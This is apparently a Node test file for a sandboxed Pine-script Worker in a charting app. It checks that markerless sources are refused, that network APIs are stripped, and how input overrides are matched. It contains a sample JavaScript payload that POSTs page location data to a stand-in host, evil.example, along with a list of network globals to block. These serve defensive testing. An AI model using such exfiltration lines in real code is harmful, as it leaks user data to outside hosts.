import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import vm from 'node:vm';
import { loadWorker, runtimeUmd, WORKER_JS } from '../../tools/pine/parity.mjs';

/* What the Worker lets a script do (review finding): PineTS runs a source with no //@version line as raw JavaScript, in a Worker that
   shares the chart page's origin. The Worker refuses such a source, and after the runtime has loaded it drops the network APIs.
   The stub tests need no runtime; the real-runtime ones (also how an input override is matched: by variable name, id or title)
   skip where it is not installed (AGPL, outside the repo). */
let UMD = null;
try { UMD = runtimeUmd(); } catch { UMD = null; }
const skip = UMD && existsSync(UMD) ? false : 'the Pine runtime is not installed (~/.homebase/pine/runtime)';

const NET = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'importScripts', 'Worker', 'SharedWorker'];
function stubWorker() {   // the Worker in a bare vm with spies for the network globals and a runtime that only records its sources
  const sent = [], built = [], called = [];
  const box = { console, Intl, Date, Math, performance, structuredClone, queueMicrotask, setTimeout, setInterval, clearTimeout, clearInterval,
                postMessage(m) { sent.push(structuredClone(m)); } };
  for (const k of NET) box[k] = function spy() { called.push(k); };
  box.importScripts = () => { box.PineTSLib = { Indicator: class { constructor(src) { built.push(src); throw new Error('stub runtime'); } } }; };
  box.self = box; box.globalThis = box;
  vm.createContext(box);
  vm.runInContext(readFileSync(WORKER_JS, 'utf8'), box, { filename: 'pineworker.js' });
  return { box, sent, built, called, post: (m) => box.onmessage({ data: m }) };
}
const BARS = [{ ms: Date.UTC(2026, 9, 19, 13, 30), o: 1, h: 2, l: 0.5, c: 1.5, v: 10 }];
const init = (source) => ({ type: 'init', source, root: 'NQ', tf_s: 300, tick_size: 0.25, point_value: 20, bars: BARS });
const JS = "($) => { fetch('http://evil.example/x', { method: 'POST', body: JSON.stringify(self.location) }); return {}; }";

test('a source with no //@version line never reaches the runtime: it would run as raw JavaScript', () => {
  for (const src of [JS, 'plot(close)\n', '//@version=6 foo\nplot(close)\n', 'plot(close) //@version=6\n', '//@version 6\nplot(close)\n', '']) {
    const w = stubWorker();
    w.post(init(src));
    assert.deepEqual(w.built, [], JSON.stringify(src));
    assert.equal(w.sent.length, 1, JSON.stringify(src));
    assert.equal(w.sent[0].type, 'error');
    assert.match(w.sent[0].message, /@version/);
  }
});

test('a source with the runtime\'s own version line goes on to the runtime', () => {
  for (const src of ['//@version=6\nindicator("x")\n', '  // @VERSION = 5  \r\nindicator("x")\r\n', '// notes\n//@version=5']) {
    const w = stubWorker();
    w.post(init(src));
    assert.deepEqual(w.built, [src]);
    assert.match(w.sent[0].message, /stub runtime/);
  }
});

test('once the runtime has loaded, the network APIs are gone from the Worker (best effort: dynamic import() cannot be blocked)', () => {
  const w = stubWorker();
  assert.deepEqual(w.called, []);
  assert.deepEqual(Array.from(vm.runInContext(`[${NET.map((k) => `typeof ${k}`).join(', ')}]`, w.box)), NET.map(() => 'undefined'));
  assert.throws(() => vm.runInContext("fetch('http://evil.example')", w.box), { name: 'TypeError' });   // another realm: match by name
  assert.throws(() => vm.runInContext("'use strict'; self.fetch = () => 1", w.box), { name: 'TypeError' }, 'and it cannot be put back');
  assert.deepEqual(w.called, []);
});

test('the real runtime: a markerless JavaScript payload is an error, not a result, and Pine still runs with the network APIs gone', { skip }, async () => {
  const bars = Array.from({ length: 60 }, (_, i) => ({ ms: BARS[0].ms + i * 300000, o: 100 + i, h: 102 + i, l: 99 + i, c: 101 + i, v: 10 }));
  let w = loadWorker(UMD);
  w.post({ ...init(JS), bars });
  const bad = await w.next();
  assert.equal(bad.type, 'error', JSON.stringify(bad).slice(0, 200));
  assert.match(bad.message, /@version/);
  w = loadWorker(UMD);
  w.post({ ...init('//@version=6\nindicator("sma")\nplot(ta.sma(close, 3), "m")\n'), bars });
  const ok = await w.next();
  assert.equal(ok.type, 'result', ok.message);
  assert.equal(ok.plots.m.at(-1).value, 159);   // sma(3) of closes 158, 159, 160
});

test('the real runtime: an override keyed by variable name or id moves one of two inputs of the same title; the title moves both (old saves)', { skip }, async () => {
  const src = '//@version=6\nindicator("two")\na = input.int(3, "Length", group="Fast")\nb = input.int(10, "Length", group="Slow")\n'
    + 'plot(ta.sma(close, a), "fast")\nplot(ta.sma(close, b), "slow")\nplot(ta.sma(close, input.int(7, "Inline")), "inl")\n';
  const bars = Array.from({ length: 60 }, (_, i) => ({ ms: BARS[0].ms + i * 300000, o: 100 + i, h: 102 + i, l: 99 + i, c: 101 + i, v: 10 }));
  const last = async (inputs) => {
    const w = loadWorker(UMD);
    w.post({ ...init(src), bars, inputs });
    const r = await w.next();
    assert.equal(r.type, 'result', r.message);
    return [r.plots.fast, r.plots.slow, r.plots.inl].map((p) => p.at(-1).value);
  };
  const base = await last({});
  assert.deepEqual(await last({ a: 5 }), [158, base[1], base[2]], 'by variable name');
  assert.deepEqual(await last({ in_1: 4 }), [base[0], 158.5, base[2]], 'by id (an input the script did not assign)');
  assert.deepEqual(await last({ in_2: 2 }), [base[0], base[1], 159.5], 'by id for the inline input');
  assert.deepEqual(await last({ Length: 5 }), [158, 158, base[2]], 'by title: both');
});
